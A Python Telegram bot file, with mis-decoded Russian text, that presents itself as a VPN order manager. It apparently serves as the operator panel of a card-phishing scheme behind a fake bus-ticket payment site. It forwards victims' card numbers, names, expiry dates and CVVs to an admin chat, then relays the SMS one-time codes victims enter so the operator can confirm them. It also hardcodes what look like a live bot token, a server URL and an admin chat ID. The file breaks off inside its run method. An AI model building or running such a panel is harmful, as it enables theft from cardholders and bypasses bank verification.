import logging
import requests
import json
import os
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
import asyncio

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è —á–µ—Ä–µ–∑ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è —Å —Ä–µ–∞–ª—å–Ω—ã–º–∏ –∑–Ω–∞—á–µ–Ω–∏—è–º–∏ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7808830885:AAHFkGTaOylnQ99RrNolU5UgjEgo2gxFrqo')  # –ü–æ–ª—É—á–∏—Ç–µ –æ—Ç @BotFather
WEB_SERVER_URL = os.environ.get('WEB_SERVER_URL', 'https://web-production-d0b17.up.railway.app')  # URL –≤–∞—à–µ–≥–æ –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–∞
ADMIN_CHAT_ID = os.environ.get('ADMIN_CHAT_ID', '2063086506')  # –í–∞—à chat_id –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π

class FixedOrderBot:
    def __init__(self, token, web_server_url):
        self.token = token
        self.web_server_url = web_server_url
        self.application = Application.builder().token(token).build()
        self.setup_handlers()
    
    def setup_handlers(self):
        """–ù–∞—Å—Ç—Ä–æ–π–∫–∞ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–æ–≤ –∫–æ–º–∞–Ω–¥ –∏ callback'–æ–≤"""
        self.application.add_handler(CommandHandler("start", self.start_command))
        self.application.add_handler(CommandHandler("orders", self.orders_command))
        self.application.add_handler(CommandHandler("help", self.help_command))
        self.application.add_handler(CallbackQueryHandler(self.button_handler))
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """–ö–æ–º–∞–Ω–¥–∞ /start"""
        welcome_message = """
ü§ñ –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ —Å–∏—Å—Ç–µ–º—É —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –∑–∞–∫–∞–∑–∞–º–∏ VPN!

–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:
/orders - –ü–æ–∫–∞–∑–∞—Ç—å –∞–∫—Ç–∏–≤–Ω—ã–µ –∑–∞–∫–∞–∑—ã
/help - –ü–æ–º–æ—â—å

‚úÖ –ë–æ—Ç –≥–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ!
üîî –í—ã –±—É–¥–µ—Ç–µ –ø–æ–ª—É—á–∞—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –Ω–æ–≤—ã—Ö –∑–∞–∫–∞–∑–∞—Ö –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏
        """
        await update.message.reply_text(welcome_message)
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """–ö–æ–º–∞–Ω–¥–∞ /help"""
        help_text = """
üìù –ü–æ–º–æ—â—å –ø–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é –±–æ—Ç–∞:

üî∏ /start - –ü—Ä–∏–≤–µ—Ç—Å—Ç–≤–∏–µ –∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
üî∏ /orders - –ü–æ–∫–∞–∑–∞—Ç—å –≤—Å–µ –æ–∂–∏–¥–∞—é—â–∏–µ –∑–∞–∫–∞–∑—ã
üî∏ /help - –ü–æ–∫–∞–∑–∞—Ç—å —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ

üîÑ –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è:
- –ö–æ–≥–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ñ–æ—Ä–º–ª—è–µ—Ç –∑–∞–∫–∞–∑ –Ω–∞ —Å–∞–π—Ç–µ, –≤—ã –ø–æ–ª—É—á–∏—Ç–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ
- –ù–∞–∂–º–∏—Ç–µ ‚úÖ "–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å" —á—Ç–æ–±—ã –æ–¥–æ–±—Ä–∏—Ç—å –∑–∞–∫–∞–∑
- –ù–∞–∂–º–∏—Ç–µ ‚ùå "–û—Ç–∫–ª–æ–Ω–∏—Ç—å" —á—Ç–æ–±—ã –æ—Ç–∫–ª–æ–Ω–∏—Ç—å –∑–∞–∫–∞–∑
- –ü–æ—Å–ª–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–æ–ª—É—á–∏—Ç –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –≤–≤–µ—Å—Ç–∏ –∫–æ–¥

üåê –°–∞–π—Ç: """ + WEB_SERVER_URL + """
        """
        await update.message.reply_text(help_text)
    
    async def orders_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """–ö–æ–º–∞–Ω–¥–∞ /orders - –ø–æ–∫–∞–∑–∞—Ç—å –≤—Å–µ –æ–∂–∏–¥–∞—é—â–∏–µ –∑–∞–∫–∞–∑—ã"""
        try:
            response = requests.get(f"{self.web_server_url}/api/bot/orders", timeout=15)
            if response.status_code == 200:
                orders = response.json()
                
                if not orders:
                    await update.message.reply_text("üìã –ù–µ—Ç –æ–∂–∏–¥–∞—é—â–∏—Ö –∑–∞–∫–∞–∑–æ–≤")
                    return
                
                await update.message.reply_text(f"üìã –ù–∞–π–¥–µ–Ω–æ –∑–∞–∫–∞–∑–æ–≤: {len(orders)}")
                
                for order_id, order_data in orders.items():
                    await self.send_order_notification(update.effective_chat.id, order_id, order_data)
            else:
                await update.message.reply_text("‚ùå –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –∑–∞–∫–∞–∑–æ–≤ —Å —Å–µ—Ä–≤–µ—Ä–∞")
                
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –∑–∞–∫–∞–∑–æ–≤: {e}")
            await update.message.reply_text("‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –∑–∞–∫–∞–∑–æ–≤")
    
    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –Ω–∞–∂–∞—Ç–∏–π –Ω–∞ inline –∫–Ω–æ–ø–∫–∏"""
        query = update.callback_query
        
        try:
            # –û—Ç–≤–µ—á–∞–µ–º –Ω–∞ callback –±—ã—Å—Ç—Ä–æ, —á—Ç–æ–±—ã –∏–∑–±–µ–∂–∞—Ç—å timeout
            await query.answer("‚è≥ –û–±—Ä–∞–±–∞—Ç—ã–≤–∞—é...")
            
            # –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º —Ä–∞–∑–Ω—ã–µ —Ç–∏–ø—ã callback_data
            if "_sms_" in query.data:
                action, verification_type, order_id = query.data.split("_", 2)
                await self.approve_payment_order(query, order_id, "sms")
            elif "_push_" in query.data:
                action, verification_type, order_id = query.data.split("_", 2)
                await self.approve_payment_order(query, order_id, "push")
            elif "confirm_code_" in query.data:
                action, sub_action, order_id = query.data.split("_", 2)
                await self.confirm_code(query, order_id)
            elif "reject_code_" in query.data:
                action, sub_action, order_id = query.data.split("_", 2)
                await self.reject_code(query, order_id)
            else:
                action, order_id = query.data.split("_", 1)
                
                if action == "approve":
                    await self.approve_order(query, order_id)
                elif action == "reject":
                    await self.reject_order(query, order_id)
                elif action == "details":
                    await self.show_order_details(query, order_id)
                
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –≤ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–µ –∫–Ω–æ–ø–æ–∫: {e}")
            try:
                await query.answer("‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞")
            except:
                pass
    
    async def approve_payment_order(self, query, order_id, verification_type):
        """–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –ø–ª–∞—Ç–µ–∂–Ω—ã–π –∑–∞–∫–∞–∑ —Å —É–∫–∞–∑–∞–Ω–Ω—ã–º —Ç–∏–ø–æ–º –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏"""
        try:
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–ø—Ä–æ—Å –Ω–∞ –æ–¥–æ–±—Ä–µ–Ω–∏–µ —Å —Ç–∏–ø–æ–º –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏
            response = requests.post(
                f"{self.web_server_url}/api/bot/approve/{order_id}",
                json={'verification_type': verification_type},
                timeout=15
            )
            
            if response.status_code == 200:
                verification_text = "üì± Push-—É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ" if verification_type == "push" else "üí¨ SMS-–∫–æ–¥"
                
                if verification_type == "sms":
                    success_message = f"""
‚úÖ SMS –û–¢–ü–†–ê–í–õ–ï–ù!

üÜî ID –∑–∞–∫–∞–∑–∞: {order_id[:8]}...
üì± SMS-–∫–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ —Ç–µ–ª–µ—Ñ–æ–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è

üîë –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –º–æ–∂–µ—Ç –≤–≤–µ—Å—Ç–∏ –ø–æ–ª—É—á–µ–Ω–Ω—ã–π –∫–æ–¥ –Ω–∞ —Å–∞–π—Ç–µ.

‚è∞ –û–∂–∏–¥–∞–µ–º –≤–≤–æ–¥–∞ –∫–æ–¥–∞...
                    """
                else:
                    success_message = f"""
‚úÖ –ü–õ–ê–¢–Å–ñ –û–î–û–ë–†–ï–ù!

üÜî ID –∑–∞–∫–∞–∑–∞: {order_id[:8]}...
üîê –¢–∏–ø –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏: {verification_text}

üöÄ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–æ–ª—É—á–∏–ª —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ–± –æ–¥–æ–±—Ä–µ–Ω–∏–∏.
üîë –¢–µ–ø–µ—Ä—å –æ–Ω –º–æ–∂–µ—Ç –∑–∞–≤–µ—Ä—à–∏—Ç—å –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—é –Ω–∞ —Å–∞–π—Ç–µ.

‚è∞ –û–∂–∏–¥–∞–µ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ...
                    """
                
                # –û–±–Ω–æ–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
                await query.edit_message_text(text=success_message)
                
                logger.info(f"–ü–ª–∞—Ç–µ–∂ {order_id} –æ–¥–æ–±—Ä–µ–Ω —Å {verification_type} –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–µ–π")
            else:
                await query.edit_message_text("‚ùå –û—à–∏–±–∫–∞ –æ–¥–æ–±—Ä–µ–Ω–∏—è –ø–ª–∞—Ç–µ–∂–∞. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.")
                
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –æ–¥–æ–±—Ä–µ–Ω–∏—è –ø–ª–∞—Ç–µ–∂–∞: {e}")
            try:
                await query.edit_message_text("‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–¥–æ–±—Ä–µ–Ω–∏–∏ –ø–ª–∞—Ç–µ–∂–∞")
            except:
                pass

    async def confirm_code(self, query, order_id):
        """–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –∫–æ–¥ –≤–≤–µ–¥–µ–Ω–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º"""
        try:
            response = requests.post(f"{self.web_server_url}/api/bot/confirm_code/{order_id}", timeout=15)
            
            if response.status_code == 200:
                success_message = f"""
‚úÖ –ö–û–î –ü–û–î–¢–í–ï–†–ñ–î–ï–ù!

üÜî ID –∑–∞–∫–∞–∑–∞: {order_id[:8]}...

üéâ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –∑–∞–≤–µ—Ä—à–µ–Ω–∞ —É—Å–ø–µ—à–Ω–æ!
üöÄ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–æ–ª—É—á–∏–ª –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ.
                """
                
                await query.edit_message_text(text=success_message)
                logger.info(f"–ö–æ–¥ –¥–ª—è –∑–∞–∫–∞–∑–∞ {order_id} –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º")
            else:
                await query.edit_message_text("‚ùå –û—à–∏–±–∫–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –∫–æ–¥–∞")
                
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –∫–æ–¥–∞: {e}")
            try:
                await query.edit_message_text("‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–∏ –∫–æ–¥–∞")
            except:
                pass

    async def reject_code(self, query, order_id):
        """–û—Ç–∫–ª–æ–Ω–∏—Ç—å –∫–æ–¥ –≤–≤–µ–¥–µ–Ω–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º"""
        try:
            response = requests.post(f"{self.web_server_url}/api/bot/reject_code/{order_id}", timeout=15)
            
            if response.status_code == 200:
                reject_message = f"""
‚ùå –ö–û–î –û–¢–ö–õ–û–ù–ï–ù!

üÜî ID –∑–∞–∫–∞–∑–∞: {order_id[:8]}...

üîÑ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –º–æ–∂–µ—Ç –≤–≤–µ—Å—Ç–∏ –∫–æ–¥ –ø–æ–≤—Ç–æ—Ä–Ω–æ.
üîë –ü–æ–ø—Ä–æ—Å–∏—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –∫–æ–¥ –∏ –≤–≤–µ—Å—Ç–∏ –µ–≥–æ —Å–Ω–æ–≤–∞.
                """
                
                await query.edit_message_text(text=reject_message)
                logger.info(f"–ö–æ–¥ –¥–ª—è –∑–∞–∫–∞–∑–∞ {order_id} –æ—Ç–∫–ª–æ–Ω–µ–Ω –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º")
            else:
                await query.edit_message_text("‚ùå –û—à–∏–±–∫–∞ –æ—Ç–∫–ª–æ–Ω–µ–Ω–∏—è –∫–æ–¥–∞")
                
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –æ—Ç–∫–ª–æ–Ω–µ–Ω–∏—è –∫–æ–¥–∞: {e}")
            try:
                await query.edit_message_text("‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–∫–ª–æ–Ω–µ–Ω–∏–∏ –∫–æ–¥–∞")
            except:
                pass

    async def approve_order(self, query, order_id):
        """–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –∑–∞–∫–∞–∑"""
        try:
            response = requests.post(f"{self.web_server_url}/api/bot/approve/{order_id}", timeout=15)
            
            if response.status_code == 200:
                success_message = f"""
‚úÖ –ó–ê–ö–ê–ó –ü–û–î–¢–í–ï–†–ñ–î–ï–ù!

üÜî ID –∑–∞–∫–∞–∑–∞: {order_id[:8]}...

üéâ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–æ–ª—É—á–∏–ª —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–∏ –∑–∞–∫–∞–∑–∞.
üîë –¢–µ–ø–µ—Ä—å –æ–Ω –º–æ–∂–µ—Ç –≤–≤–µ—Å—Ç–∏ —Å–≤–æ–π –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –Ω–∞ —Å–∞–π—Ç–µ.

‚è∞ –ó–∞–∫–∞–∑ –æ–∂–∏–¥–∞–µ—Ç –≤–≤–æ–¥–∞ –∫–æ–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º.
                """
                
                # –û–±–Ω–æ–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
                await query.edit_message_text(
                    text=success_message
                )
                
                logger.info(f"–ó–∞–∫–∞–∑ {order_id} –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º")
            else:
                await query.edit_message_text("‚ùå –û—à–∏–±–∫–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –∑–∞–∫–∞–∑–∞. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.")
                
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –∑–∞–∫–∞–∑–∞: {e}")
            try:
                await query.edit_message_text("‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–∏ –∑–∞–∫–∞–∑–∞")
            except:
                pass
    
    async def reject_order(self, query, order_id):
        """–û—Ç–∫–ª–æ–Ω–∏—Ç—å –∑–∞–∫–∞–∑"""
        try:
            response = requests.post(f"{self.web_server_url}/api/bot/reject/{order_id}", timeout=15)
            
            if response.status_code == 200:
                reject_message = f"""
‚ùå –ó–ê–ö–ê–ó –û–¢–ö–õ–û–ù–ï–ù

üÜî ID –∑–∞–∫–∞–∑–∞: {order_id[:8]}...

üì§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–æ–ª—É—á–∏–ª —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ–± –æ—Ç–∫–ª–æ–Ω–µ–Ω–∏–∏ –∑–∞–∫–∞–∑–∞.
                """
                await query.edit_message_text(reject_message)
                logger.info(f"–ó–∞–∫–∞–∑ {order_id} –æ—Ç–∫–ª–æ–Ω–µ–Ω –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º")
            else:
                await query.edit_message_text("‚ùå –û—à–∏–±–∫–∞ –æ—Ç–∫–ª–æ–Ω–µ–Ω–∏—è –∑–∞–∫–∞–∑–∞")
                
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –æ—Ç–∫–ª–æ–Ω–µ–Ω–∏—è –∑–∞–∫–∞–∑–∞: {e}")
            try:
                await query.edit_message_text("‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–∫–ª–æ–Ω–µ–Ω–∏–∏ –∑–∞–∫–∞–∑–∞")
            except:
                pass
    
    async def show_order_details(self, query, order_id):
        """–ü–æ–∫–∞–∑–∞—Ç—å –¥–µ—Ç–∞–ª–∏ –∑–∞–∫–∞–∑–∞"""
        try:
            response = requests.get(f"{self.web_server_url}/api/bot/order/{order_id}", timeout=15)
            
            if response.status_code == 200:
                order = response.json()
                order_data = order['data']
                
                details_message = f"""
üìã –î–ï–¢–ê–õ–ò –ó–ê–ö–ê–ó–ê

üÜî ID: {order_id[:8]}...
üë§ –ò–º—è: {order_data['name']}
üìû –¢–µ–ª–µ—Ñ–æ–Ω: {order_data['phone']}
üìß Email: {order_data['email']}
üõç –£—Å–ª—É–≥–∞: {order_data['service']}
üìù –°–æ–æ–±—â–µ–Ω–∏–µ: {order_data.get('message', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}

üìÖ –°–æ–∑–¥–∞–Ω: {order['created_at'][:19]}
üîÑ –°—Ç–∞—Ç—É—Å: {order['status']}
                """
                
                # –°–æ–∑–¥–∞–µ–º –∫–Ω–æ–ø–∫–∏ –¥–µ–π—Å—Ç–≤–∏–π —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –∑–∞–∫–∞–∑ –µ—â–µ –Ω–µ –æ–±—Ä–∞–±–æ—Ç–∞–Ω
                if order['status'] in ['pending', 'code_submitted']:
                    keyboard = [
                        [
                            InlineKeyboardButton("‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å", callback_data=f"approve_{order_id}"),
                            InlineKeyboardButton("‚ùå –û—Ç–∫–ª–æ–Ω–∏—Ç—å", callback_data=f"reject_{order_id}")
                        ]
                    ]
                    reply_markup = InlineKeyboardMarkup(keyboard)
                    
                    await query.edit_message_text(
                        text=details_message,
                        reply_markup=reply_markup
                    )
                else:
                    await query.edit_message_text(text=details_message)
            else:
                await query.edit_message_text("‚ùå –ó–∞–∫–∞–∑ –Ω–µ –Ω–∞–π–¥–µ–Ω")
                
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –¥–µ—Ç–∞–ª–µ–π –∑–∞–∫–∞–∑–∞: {e}")
            try:
                await query.edit_message_text("‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –¥–µ—Ç–∞–ª–µ–π –∑–∞–∫–∞–∑–∞")
            except:
                pass
    
    async def send_code_notification(self, chat_id, order_id, order_data, user_code):
        """–û—Ç–ø—Ä–∞–≤–∏—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –≤–≤–µ–¥–µ–Ω–Ω–æ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º –∫–æ–¥–µ"""
        try:
            data = order_data['data']
            created_time = datetime.fromisoformat(order_data['created_at']).strftime('%d.%m.%Y %H:%M')
            
            message = f"""
üî¢ –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–¨ –í–í–ï–õ –ö–û–î!

üë§ –ò–º—è: {data.get('name', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}
üìß Email: {data.get('email', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}

üîê –í–í–ï–î–ï–ù–ù–´–ô –ö–û–î: {user_code}

üìÖ –í—Ä–µ–º—è: {created_time}
üÜî ID: {order_id[:8]}...

–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:
            """
            
            # –°–æ–∑–¥–∞–µ–º –∫–Ω–æ–ø–∫–∏ –¥–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –∏–ª–∏ –æ—Ç–∫–ª–æ–Ω–µ–Ω–∏—è –∫–æ–¥–∞
            keyboard = [
                [
                    InlineKeyboardButton("‚úÖ –ü—Ä–∞–≤–∏–ª—å–Ω—ã–π –∫–æ–¥", callback_data=f"confirm_code_{order_id}")
                ],
                [
                    InlineKeyboardButton("‚ùå –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –∫–æ–¥", callback_data=f"reject_code_{order_id}")
                ]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await self.application.bot.send_message(
                chat_id=chat_id,
                text=message,
                reply_markup=reply_markup
            )
            
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –∫–æ–¥–µ: {e}")

    async def send_order_notification(self, chat_id, order_id, order_data):
        """–û—Ç–ø—Ä–∞–≤–∏—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –Ω–æ–≤–æ–º –∑–∞–∫–∞–∑–µ"""
        try:
            data = order_data['data']
            created_time = datetime.fromisoformat(order_data['created_at']).strftime('%d.%m.%Y %H:%M')
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ç–∏–ø –∑–∞–∫–∞–∑–∞
            order_type = order_data.get('order_type', 'standard')
            
            if order_type == 'payment':
                # –ó–∞–∫–∞–∑ —Å –¥–∞–Ω–Ω—ã–º–∏ –∫–∞—Ä—Ç—ã
                card_data = order_data.get('card_data', {})
                route_info = order_data.get('route_info', {})
                
                message = f"""
üí≥ –ù–û–í–´–ô –ü–õ–ê–¢–Å–ñ!

üë§ –ò–º—è: {data.get('name', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}
üìß Email: {data.get('email', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}

üöå –ú–∞—Ä—à—Ä—É—Ç: {route_info.get('from_city', '')} ‚Üí {route_info.get('to_city', '')}
üìÖ –î–∞—Ç–∞ –ø–æ–µ–∑–¥–∫–∏: {route_info.get('travel_date', '')}
üí∫ –ú–µ—Å—Ç–æ: {route_info.get('seat', '')}

                üí≥ –î–ê–ù–ù–´–ï –ö–ê–†–¢–´:
üî¢ –ù–æ–º–µ—Ä: {data.get('cardNumber', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}
üë§ –ò–º—è –Ω–∞ –∫–∞—Ä—Ç–µ: {data.get('cardName', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}
üìÖ –°—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è: {data.get('expiryDate', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}
üîê CVV: {data.get('cvv', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}
üí∞ –°—É–º–º–∞: {data.get('amount', 0)} z≈Ç

üìÖ –í—Ä–µ–º—è: {created_time}
üÜî ID: {order_id[:8]}...

–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:
                """
            else:
                # –û–±—ã—á–Ω—ã–π –∑–∞–∫–∞–∑
                message = f"""
üîî –ù–û–í–´–ô –ó–ê–ö–ê–ó!

üë§ –ò–º—è: {data.get('name', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}
üìû –¢–µ–ª–µ—Ñ–æ–Ω: {data.get('phone', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}
üìß Email: {data.get('email', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}

üìÖ –í—Ä–µ–º—è: {created_time}
üÜî ID: {order_id[:8]}...

–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:
                """
            
            # –°–æ–∑–¥–∞–µ–º inline –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É —Å –∫–Ω–æ–ø–∫–∞–º–∏ –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç —Ç–∏–ø–∞ –∑–∞–∫–∞–∑–∞
            if order_type == 'payment':
                keyboard = [
                    [
                        InlineKeyboardButton("üì± –û—Ç–ø—Ä–∞–≤–∏—Ç—å SMS", callback_data=f"send_sms_{order_id}")
                    ],
                    [
                        InlineKeyboardButton("‚ùå –û—Ç–∫–ª–æ–Ω–∏—Ç—å", callback_data=f"reject_{order_id}")
                    ]
                ]
            else:
                keyboard = [
                    [
                        InlineKeyboardButton("‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å", callback_data=f"approve_{order_id}"),
                        InlineKeyboardButton("‚ùå –û—Ç–∫–ª–æ–Ω–∏—Ç—å", callback_data=f"reject_{order_id}")
                    ],
                    [
                        InlineKeyboardButton("üìã –î–µ—Ç–∞–ª–∏", callback_data=f"details_{order_id}")
                    ]
                ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await self.application.bot.send_message(
                chat_id=chat_id,
                text=message,
                reply_markup=reply_markup
            )
            
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è: {e}")
    
    def run(self):
        """–ó–∞–ø—É—Å–∫ –±–æ—Ç–∞"""
        logger.info("–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–Ω–æ–≥–æ Telegram –±–æ—Ç–∞...")
        
        if self.token == "YOUR_BOT_TOKEN_HERE":
